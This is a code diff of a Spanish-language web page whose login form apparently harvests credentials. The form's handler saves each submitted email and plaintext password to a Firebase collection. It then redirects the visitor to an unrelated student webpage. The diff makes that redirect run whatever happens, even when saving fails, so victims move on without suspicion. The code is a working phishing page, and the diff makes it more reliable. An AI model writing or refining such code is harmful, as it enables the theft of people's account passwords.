@@ -1,4 +1,4 @@
-  <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
@@ -138,23 +138,21 @@
       const password = this.password.value;
 
       try {
-        // Guardar en Firebase
+        // Intentar guardar en Firebase
         await addDoc(collection(db, "usuarios"), {
           email: email,
           password: password,
           fecha: new Date().toLocaleString()
         });
-
         console.log("✅ Datos guardados en Firebase");
-
-        // Redirección con pequeño retraso para asegurar que se guarden los datos
-        setTimeout(() => {
-          window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
-        }, 100);
-
       } catch (error) {
         console.error("❌ Error guardando datos:", error);
-        alert("Error al guardar datos. Intenta nuevamente.");
+        alert("No se pudieron guardar los datos, pero igual continuarás.");
+      } finally {
+        // Pase lo que pase, redirige
+        setTimeout(() => {
+          window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
+        }, 200);
       }
     });
 
